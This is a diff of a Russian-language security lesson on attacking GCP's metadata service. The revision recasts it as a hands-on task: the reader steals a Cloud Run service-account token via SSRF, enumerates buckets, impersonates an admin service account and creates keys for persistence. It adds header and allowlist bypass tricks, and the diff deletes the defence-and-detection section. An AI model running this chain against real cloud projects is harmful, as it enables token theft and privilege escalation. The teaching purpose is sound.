@@ -15,191 +15,132 @@ estimated_minutes: 50
 summary: "Как устроен metadata-сервис GCP, чем он отличается от AWS IMDS, как через SSRF/RCE получить OAuth-токен сервисного аккаунта и как из токена вырастить имперсонацию и доступ к ресурсам."
 ---
 
-## Зачем этот урок
+## Задача
 
-В GCP нет IAM-роли «на инстансе» в AWS-смысле. Вместо этого каждый ресурс (Compute Engine, Cloud Run, Cloud Functions, GKE-под) имеет **привязанный сервисный аккаунт**, а его **OAuth2 access token** выдаётся локальным metadata-сервисом по адресу `metadata.google.internal` (`169.254.169.254`). Любая SSRF или RCE на GCP-ресурсе превращается в кражу токена. Токен — это `Bearer`, который работает против Google Cloud API в пределах прав сервисного аккаунта и его **scopes**. Этот урок — про устройство metadata-сервиса GCP, его отличия от AWS IMDS и практическую цепочку «SSRF → токен → имперсонация → ресурсы».
+На Cloud Run (серверлесс-контейнеры Google) ты нашёл SSRF — приложение по твоему URL делает HTTP-запрос. Как из этого получить доступ к облаку? В GCP нет «роли на инстансе», как в AWS: вместо этого у каждого ресурса есть привязанный **сервисный аккаунт (SA)**, а его **OAuth2-токен** выдаёт локальный **metadata-сервис**. Задача урока — украсть токен через SSRF и вырастить из него имперсонацию и доступ к ресурсам.
 
 ## Как устроен metadata-сервис GCP
 
-Базовый адрес:
+Базовый адрес — `metadata.google.internal` (он же `169.254.169.254`):
 
 ```
 http://metadata.google.internal/computeMetadata/v1/
-http://169.254.169.254/computeMetadata/v1/
 ```
 
-**Ключевое отличие от AWS:** GCP требует заголовок `Metadata-Flavor: Google` на каждый запрос. Без него сервер вернёт `403 Forbidden`. Это частичная защита от «тупой» SSRF, которая не умеет добавлять заголовки, но она обходится, если уязвимость позволяет инъекцию заголовков или редирект.
+**Главное отличие от AWS:** GCP требует заголовок `Metadata-Flavor: Google` на каждый запрос. Без него — `403 Forbidden`. Это частичная защита от «тупой» SSRF, которая не умеет добавлять заголовки, но обходится, если уязвимость позволяет инъекцию заголовков или редирект.
 
 Полезные пути:
 
 | Путь | Что отдаёт |
 |------|-----------|
-| `instance/service-accounts/default/token` | OAuth2 access token + expires_in |
+| `instance/service-accounts/default/token` | OAuth2 access token + `expires_in` |
 | `instance/service-accounts/default/email` | email сервисного аккаунта |
 | `instance/service-accounts/default/scopes` | список scopes |
-| `instance/service-accounts/<sa-email>/token` | токен конкретного SA |
 | `project/project-id` | id проекта |
-| `instance/attributes/` | кастомные метаданные (startup-script, ssh-keys) |
-| `instance/attributes/ssh-keys` | публичные SSH-ключи, добавленные через metadata |
-| `instance/network-interfaces/` | сетевые интерфейсы и внутренние IP |
-| `instance/identity` | идентичность для Workload Identity (GKE) |
+| `instance/attributes/?recursive=true` | кастомные метаданные (startup-script, ssh-keys) |
 
-Особенность GCP: **scope ≠ permission**. Токен может иметь scope `cloud-platform` (широкий API-доступ), но реальные права всё равно ограничены IAM-ролями сервисного аккаунта. И наоборот: узкий scope может отрезать API, даже если роль широкая. Поэтому после кражи токена нужно проверить и scopes, и фактические права.
+Ключевой нюанс GCP: **scope ≠ permission**. Токен может иметь scope `cloud-platform` (широкий доступ к API), но реальные права всё равно ограничены IAM-ролями SA. И наоборот: узкий scope отрезает API, даже если роль широкая. Поэтому после кражи проверяй и scopes, и фактические права.
 
-В GKE с **Workload Identity** под обращается к metadata-сервису GKE, который выдаёт токен привязанного **Google service account (GSA)**. Kubernetes service account (KSA) маппится на GSA аннотацией. Если маппинг сделан с широкими правами, компромисс пода = компромисс GSA.
+## Данные, с которыми работаем
 
-## Инструменты и команды
-
-Прямое чтение (изнутри ресурса):
+SSRF в Cloud Run принимает параметр `url` и делает GET. Прямой запрос к metadata выглядел бы так (изнутри ресурса):
 
 ```bash
-# Токен
-curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
-# => {"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}
-
-# Email и scopes
-curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
-curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
-
-# Кастомные метаданные
-curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true"
+$ curl -s -H "Metadata-Flavor: Google" \
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+{"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}
 ```
 
-Использование токена против API:
+Но у нас SSRF, а не shell. Если SSRF умеет добавлять заголовки — отправляем `Metadata-Flavor: Google`. Если нет — пробуем обходы (о них ниже).
 
-```bash
-TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
+## Шаг 1: получаем токен через SSRF
 
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://cloudresourcemanager.googleapis.com/v1/projects" | jq .
-```
-
-Разведка прав:
-
-```bash
-# gcloud с токеном (gcloud auth login --access-token-file)
-echo "$TOKEN" > /tmp/tok
-gcloud auth login --access-token-file=/tmp/tok --quiet
-gcloud auth list
-gcloud projects list
-gcloud iam service-accounts list
-```
-
-## Разобранный пример: от SSRF к токену и имперсонации
-
-Сценарий: на Cloud Run есть SSRF, позволяющая делать GET с произвольным URL. Цель — забрать токен runtime SA.
-
-Шаг 1 — если SSRF умеет добавлять заголовки (или через редирект), обращаемся к metadata:
+Целимся в путь токена с нужным заголовком:
 
 ```
 GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 Header: Metadata-Flavor: Google
 ```
 
-Ответ: JSON с `access_token`. Если SSRF не умеет заголовки, пробуем варианты: инъекция CRLF в URL, редирект с внешнего сервера на metadata, `gopher://`, или использовать компонент, который сам ставит `Metadata-Flavor` (некоторые Google SDK делают это автоматически).
+В ответе — JSON с `access_token`. Дальше работаем с ним как с `Bearer`.
 
-Шаг 2 — проверяем, кто мы и какие scopes:
-
-```bash
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN"
-```
-
-Шаг 3 — разведка ресурсов. Токен может читать Storage, Secret Manager, проекты:
+## Шаг 2: узнаём, кто мы и что можем
 
 ```bash
-curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=my-project"
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://secretmanager.googleapis.com/v1/projects/my-project/secrets"
+$ curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN" | jq '{email,scope,expires_in}'
+{"email":"run-sa@my-project.iam.gserviceaccount.com","scope":"https://www.googleapis.com/auth/cloud-platform","expires_in":3599}
 ```
 
-Шаг 4 — **имперсонация**. Если у SA есть право `iam.serviceAccounts.getAccessToken` (или `iam.serviceAccounts.actAs`), можно выпустить токен другого сервисного аккаунта — часто более привилегированного:
+Токен от `run-sa`, scope широкий. Проверяем ресурсы:
 
 ```bash
-curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/target-sa@my-project.iam.gserviceaccount.com:generateAccessToken" \
-  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'
-# => {"accessToken":"ya29...","expireTime":"..."}
+$ curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=my-project" | jq -r '.items[].name'
+prod-backups
+app-configs
 ```
 
-Шаг 5 — при наличии `iam.serviceAccounts.getAccessToken` на admin-SA получаем `roles/owner` проекта. Дальше — экспорт ключа (`keys.create`) для персистентности или прямое управление IAM.
+## Шаг 3: имперсонация — самый быстрый рост прав
 
-Цепочка: `SSRF → metadata token → SA с getAccessToken → имперсонация admin-SA → owner`.
+Если у SA есть право `iam.serviceAccounts.getAccessToken` (или `actAs`), можно выпустить токен **другого** SA — часто более привилегированного:
 
-## Варианты атак и обходы
+```bash
+$ curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/admin-sa@my-project.iam.gserviceaccount.com:generateAccessToken" \
+    -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' | jq -r '.accessToken' | cut -c1-15
+ya29.c.b0Aa
+```
 
-- **Metadata header bypass.** Если SSRF не умеет заголовки, ищите компоненты, которые их ставят: Google Cloud-клиентские библиотеки, прокси, серверные фетчеры. Иногда достаточно перенаправить запрос на `metadata.google.internal` с заголовком, который сервер подставит.
-- **DNS rebinding.** Если SSRF валидирует хост по имени, а затем резолвит его повторно, DNS rebinding на `169.254.169.254` обходит allowlist.
-- **GKE metadata server.** В Workload Identity под получает токен через `169.254.169.254` (GKE metadata server) — тот же путь, но требует `Metadata-Flavor`. Имперсонация KSA→GSA раскрывает GSA.
-- **Startup-script в metadata.** Кастомные метаданные часто содержат `startup-script`, где лежат токены, пароли БД, ключи API. Читайте `instance/attributes/?recursive=true`.
-- **SSH-ключи в metadata.** `instance/attributes/ssh-keys` даёт список ключей и позволяет понять, кто имеет доступ; иногда там временные ключи.
-- **Service account keys.** Если у вас `iam.serviceAccountKeys.create`, выпустите JSON-ключ для долгоживущего доступа.
-- **Scopes как ограничение.** Если scope узкий (`devstorage.read_only`), не тратьте время на IAM-эскалацию — сначала поищите ресурс с широким scope.
+Теперь мы — `admin-sa`. Если у него роль `owner` на проект — доступ полный. При наличии `iam.serviceAccountKeys.create` выпускаем ключ для персистентности.
 
-## Частые ошибки и подводные камни
+## Полный прогон от начала до конца
 
-- **Забыть заголовок `Metadata-Flavor: Google`.** Без него ответ — 403; многие SSRF-пейлоады падают здесь.
-- **Путать scope и permission.** `cloud-platform` scope не означает admin; смотрите IAM-роли SA.
-- **Считать токен долгоживущим.** По умолчанию ~1 час; планируйте обновление, повторяя запрос к metadata.
-- **Игнорировать `default` vs конкретный SA.** `.../service-accounts/default/token` — самый частый путь; конкретный SA указывается по email.
-- **Не проверять имперсонацию.** Токен SA без `getAccessToken` всё ещё может читать Secrets/Storage — не сдавайтесь после первой ошибки.
-- **Ошибка на GKE.** Если под без Workload Identity, metadata может отдавать токен **node** SA (широкий!) — это часто лучше, чем KSA.
+1. SSRF с заголовком `Metadata-Flavor: Google` → токен `run-sa`.
+2. `tokeninfo` → email, scope, срок жизни.
+3. Токен читает Storage (`prod-backups`).
+4. `generateAccessToken` на `admin-sa` → имперсонация.
+5. От имени admin — Secrets/Storage/ключи.
 
-## Защита и детект
+## Если не сработало
 
-- **Metadata concealment / GKE metadata server.** Включайте, чтобы под не видел node-level metadata.
-- **Минимальные роли SA.** Runtime SA не должен иметь `getAccessToken`, `setIamPolicy`, `serviceAccountKeys.create`.
-- **Workload Identity с узким GSA.** Маппьте KSA на GSA с минимальными правами, не на default compute SA.
-- **Отключайте legacy metadata endpoints.** `--metadata=disable-legacy-endpoints=true`.
-- **Детект.** Cloud Audit Logs: `GenerateAccessToken`, `GenerateIdToken`, `GetServiceAccount`, `CreateServiceAccountKey`. Алерты на вызовы metadata-эндпоинтов с необычных IP (если есть VPC Flow Logs / Cloud IDS), на имперсонацию вне CI, на создание ключей.
-- **Org policies.** `iam.disableServiceAccountKeyCreation` запрещает выпуск ключей; `iam.allowedPolicyMemberDomains` ограничивает внешних участников.
+- **SSRF не ставит заголовок.** Тогда пробуй: инъекцию CRLF в URL, редирект с твоего сервера на metadata, `gopher://`, или компонент, который сам ставит `Metadata-Flavor` (некоторые Google SDK делают это автоматически).
+- **DNS rebinding.** Если SSRF валидирует хост по имени, а резолвит повторно, перепривязка на `169.254.169.254` обходит allowlist.
+- **Узкий scope.** Если scope `devstorage.read_only`, не трать время на IAM-эскалацию — ищи ресурс с широким scope.
+- **Нет `getAccessToken`.** Токен без имперсонации всё равно может читать Secrets/Storage — не сдавайся после первой ошибки.
+- **GKE.** Если под без Workload Identity, metadata может отдавать токен **node** SA (часто широкий) — это может быть лучше, чем KSA.
+- **Metadata concealment.** В GKE под может не видеть node metadata — тогда работает только GKE metadata server.
 
 ## Сравнение metadata-сервисов трёх облаков
 
 | Облако | Адрес | Заголовок | Особенность |
 |--------|-------|-----------|-------------|
 | AWS EC2 | 169.254.169.254 | IMDSv2: токен + `X-aws-ec2-metadata-token` | hop limit, IMDSv2 защищает от SSRF |
-| AWS ECS | 169.254.170.2 | нет | relative URI в env |
 | GCP | metadata.google.internal | `Metadata-Flavor: Google` | scope ≠ permission, имперсонация |
 | Azure | 169.254.169.254 | `Metadata: true` | `api-version`, managed identity |
 
-Понимание этих различий критично: пейлоад под AWS не сработает на GCP без правильного заголовка, а логика имперсонации есть только в GCP.
+Практический вывод: пейлоад под AWS не сработает на GCP без правильного заголовка, а логика имперсонации (`getAccessToken`) есть только в GCP. Поэтому после кражи токена всегда проверяй именно это право — оно часто даёт самый быстрый рост привилегий.
 
-## GKE и Workload Identity: отдельный случай
+## GKE и Workload Identity
 
-В GKE идентичность пода устроена иначе, чем в Compute Engine, и это важно для атакующего. По умолчанию под обращается к metadata-сервису **узла** и получает токен сервисного аккаунта **ноды** — обычно это `default` compute SA, который в старых кластерах имеет роль `Editor` на проект. Это означает, что компромисс любого пода даёт очень широкий доступ. Именно поэтому Google ввёл **Workload Identity**: под больше не видит node metadata, а обращается к GKE metadata server, который выдаёт токен **привязанного GSA**. Связь задаётся аннотацией Kubernetes service account:
+В GKE идентичность пода устроена иначе, и это важно. По умолчанию под обращается к metadata узла и получает токен сервисного аккаунта **ноды** — обычно `default` compute SA, который в старых кластерах имеет роль `Editor` на проект. То есть компромисс любого пода даёт широкий доступ. Чтобы это исправить, Google ввёл **Workload Identity**: под обращается к GKE metadata server, который выдаёт токен привязанного GSA (связь задаётся аннотацией KSA). Проверяя кластер, смотри: включён ли Workload Identity на node pool, какие роли у GSA, и кто имеет `iam.workloadIdentityUser`. Если Workload Identity не включён — под видит node SA, и это часто самая быстрая эскалация.
 
-```yaml
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: app-ksa
-  annotations:
-    iam.gke.io/gcp-service-account: app-gsa@my-project.iam.gserviceaccount.com
-```
+## Что мы теперь знаем
 
-При проверке кластера смотрите: (1) включён ли Workload Identity на node pool (`gcloud container node-pools describe ... --format='value(config.workloadMetadataConfig)'`), (2) есть ли аннотация у KSA, (3) какие роли у GSA. Если Workload Identity не включён, под видит node SA — и это часто самая быстрая эскалация. Если включён, но GSA имеет широкие роли (например, `roles/editor` или `secretmanager.admin`), вы всё равно получаете много. Отдельно проверьте `iam.workloadIdentityUser` bindings: кто может имперсонировать GSA.
+- Metadata GCP выдаёт OAuth2-токен SA; обязателен заголовок `Metadata-Flavor: Google`.
+- Scope ограничивает API, а права задаёт IAM-роль SA.
+- `iam.serviceAccounts.getAccessToken` — путь к имперсонации более привилегированного SA.
+- Кастомные метаданные (`instance/attributes`) часто содержат startup-script с секретами.
+- В GKE по умолчанию под может получать токен node SA — широкий доступ.
 
-Практическая проверка изнутри пода:
+## На что смотреть дальше
 
-```bash
-curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
-# app-gsa@my-project.iam.gserviceaccount.com  (Workload Identity)
-# ИЛИ
-# 1234567890-compute@developer.gserviceaccount.com  (node SA — плохо)
-```
-
-## Что дальше / решение
-
-Metadata GCP — вход в сервисный аккаунт. После кражи токена: (1) проверьте scopes и `tokeninfo`; (2) перечислите доступные ресурсы (проекты, Storage, Secret Manager); (3) обязательно проверьте право `getAccessToken` — имперсонация почти всегда даёт самый быстрый рост привилегий; (4) при наличии `serviceAccountKeys.create` выпустите ключ для персистентности. Если вы в GKE, посмотрите, не отдаётся ли node SA — это часто шире KSA. Записывайте цепочку и найденные секреты, они открывают следующий шаг.
+- **cloud-gcp-iam**: роли и `setIamPolicy`.
+- **cloud-gcp-wif**: как внешний IdP получает GCP-токен без ключей.
+- **cloud-ec2-ssrf**: сравнение с AWS IMDS.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Какой заголовок обязателен для запроса к metadata-сервису GCP?"
@@ -234,7 +175,19 @@ Metadata GCP — вход в сервисный аккаунт. После кр�
     - "В instance/identity"
   answer: 0
   explanation: "Кастомные метаданные содержат startup-script, ssh-keys и другие артефакты."
+- question: "Почему в GKE под по умолчанию может получить широкий доступ?"
+  options:
+    - "Без Workload Identity он видит токен сервисного аккаунта узла (node SA)"
+    - "Все поды имеют роль owner"
+    - "Metadata не требует заголовка"
+    - "GKE отключает IAM"
+  answer: 0
+  explanation: "Node SA часто имеет широкие роли (Editor), поэтому компромисс пода опасен."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **Cloud Functions и Cloud Run** как источники уязвимостей — инъекции и захват service account. А пока главное запомни: **в GCP SSRF превращается в токен SA, а `getAccessToken` превращает токен в имперсонацию — это два шага, которые надо проверить всегда.**
 
 ## Где пригодится
 
